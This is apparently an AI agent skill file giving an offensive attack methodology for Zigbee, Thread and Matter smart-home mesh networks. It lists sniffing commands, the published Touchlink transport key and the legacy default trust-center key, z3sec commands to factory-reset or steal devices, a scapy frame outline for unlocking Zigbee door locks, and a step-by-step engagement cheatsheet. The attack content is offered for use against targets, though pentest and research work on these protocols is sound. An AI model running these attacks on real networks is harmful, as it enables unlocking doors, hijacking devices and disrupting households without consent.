---
name: offensive-zigbee-thread-matter
description: Zigbee, Thread, and Matter mesh-protocol attack methodology — IEEE 802.15.4
  sniffing with TI CC2531 / CC2540 / Sonoff Zigbee Dongle E, KillerBee toolkit, Touchlink
  commissioning abuse with the well-known transport key, replay/injection attacks,
  Zigbee Cluster Library command abuse for door locks and bulbs, Thread network credential
  theft, Matter commissioning chain analysis, and 6LoWPAN/IPv6 routing exploitation.
  Use when targeting smart-home or commercial mesh deployments, Zigbee-based door
  locks, lighting, or sensor networks.
---

# Zigbee / Thread / Matter Attacks

802.15.4-based mesh protocols underpin most "smart home" devices. Zigbee is widely deployed and has well-known crypto-key-reuse issues; Thread (modern, IPv6-based) ships with stronger defaults; Matter unifies their commissioning model with stronger crypto but still has implementation pitfalls.

## Quick Workflow

1. Sniff target frequency (channels 11–26 in 2.4 GHz)
2. Identify network coordinator and joining devices
3. For Zigbee: try Touchlink commissioning with the well-known key
4. Capture join-key exchange when devices commission
5. Replay or inject ZCL/ZHA cluster commands

---

## Hardware

| Adapter | Use |
|---|---|
| TI CC2531 USB stick | Cheap, works with Zigbee2MQTT, KillerBee |
| TI CC2540 / CC2652 | Zigbee + Thread + BLE |
| Sonoff Zigbee Dongle E (CC2652P) | Modern, well-supported |
| ApiMote (KillerBee dev) | Multi-channel, scapy-dot15d4 |
| HackRF + appropriate firmware | Lower-level RF flexibility |

## Discovery + Sniffing

```bash
# KillerBee suite
zbstumbler -i 0                 # find Zigbee networks
zbid                            # ID coordinators
zbdump -c 11 -w zigbee.pcap     # dump channel 11 to pcap

# scapy-dot15d4 for crafted frames
python3
>>> from scapy.contrib.dot15d4 import *
>>> sniff(iface='/dev/ttyACM0', count=50)
```

In Wireshark with the dot15d4 + zbee_nwk dissectors, you'll see frame counters, network keys (if joined), and ZCL commands.

## Touchlink Commissioning Abuse

Touchlink (used by Zigbee 3.0 commissioning, especially in lighting) uses a **well-known transport key**:

```
0x9F559A553B7A6B2C5C4FBB4E84956F3D
```

Many consumer Zigbee bulbs / strips accept Touchlink commissioning from any nearby radio with this key — joining them to your network or stealing them from theirs.

```bash
# z3sec — Zigbee 3 commissioning attack toolkit
git clone https://github.com/IoTsec/Z3sec
python z3sec_inter_pan.py --command "factory_reset_request" --device <addr>
python z3sec_inter_pan.py --command "join_network" --network <PANID>
```

Outcomes:
- Factory-reset victim devices remotely (DoS / mass disrupt)
- Steal lights / sensors into attacker network
- Read network keys after joining device-to-network

## Network Key Capture During Joins

```bash
# Capture coordinator + joining device exchange
zbdump -c <ch> -w join.pcap

# Decrypt if you obtain the trust center link key
# Older Zigbee 1.x networks used a default trust center link key:
# ZigBeeAlliance09
# Modern networks use device-specific install codes
```

Once you have the network key, all traffic on that mesh is decrypted in Wireshark.

## ZCL / ZHA Cluster Command Abuse

Zigbee Cluster Library defines on/off/level/lock clusters. With network key, you can issue commands as any device:

```python
# scapy-dot15d4 frame to unlock a door lock
from scapy.contrib.dot15d4 import *
from scapy.contrib.zigbee import *

frame = Dot15d4FCS()/Dot15d4Data()/ZigbeeNWK(...)/ZigbeeAppDataPayload(...)/ZCLDoorLock(...)
sendp(frame, iface='/dev/ttyACM0')
```

The same primitive opens locks, toggles switches, dims lights, or floods the network with control traffic.

## Thread Specifics

Thread (used by Apple HomePod, Nest, Eero) uses 802.15.4 with IPv6 (6LoWPAN) and stronger commissioning crypto.

- Network credential is a **commissioner-distributed PSKc**
- Devices join with the commissioner present
- Mesh commissioning protocol is over UDP/CoAP

Attack surface:
- PSKc theft from commissioner devices (mobile app companion, Apple Home, Nest app)
- Reusing a leaked credential to join target network
- 6LoWPAN routing attacks (rank manipulation, sinkhole)

## Matter Commissioning

Matter unifies Zigbee/Thread/Wi-Fi device onboarding under one commissioning model:

- QR code or manual setup code grants commissioning permission
- Bluetooth LE used for initial commissioning
- Subsequent communication over Wi-Fi or Thread

Attack surface:
- Setup-code reuse / replay if commissioning window not closed
- BLE-MITM during initial commissioning (see `offensive-bluetooth-ble`)
- Fabric-attestation flaws in early implementations

## Detection

- Coordinator may log unexpected device joins
- Hub apps surface "new device" notifications — commonly ignored by users
- Wireshark/Sonoff captures from defenders are rare — most environments don't monitor 802.15.4

## Engagement Cheatsheet

```bash
# 1. Identify networks + channels
zbstumbler -i 0

# 2. Sniff target channel
zbdump -c <ch> -w cap.pcap
# Open in Wireshark with dot15d4/zigbee dissectors

# 3. Touchlink attack on consumer Zigbee 3.0 lighting
python z3sec_inter_pan.py --command "factory_reset_request" --target <addr>

# 4. Steal device into attacker network
python z3sec_inter_pan.py --command "join_network" --target <addr>

# 5. With network key, issue ZCL commands directly
# (custom scapy-dot15d4 + zbee_nwk frames)

# 6. For Thread: focus on commissioner / PSKc theft from companion apps
```

---

## Key References

- KillerBee: github.com/riverloopsec/killerbee
- Z3sec: github.com/IoTsec/Z3sec
- "Zigbee Insecurity" research (CON Black Hat talks)
- Thread spec: threadgroup.org/support
- Matter / CSA spec: csa-iot.org/all-solutions/matter
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
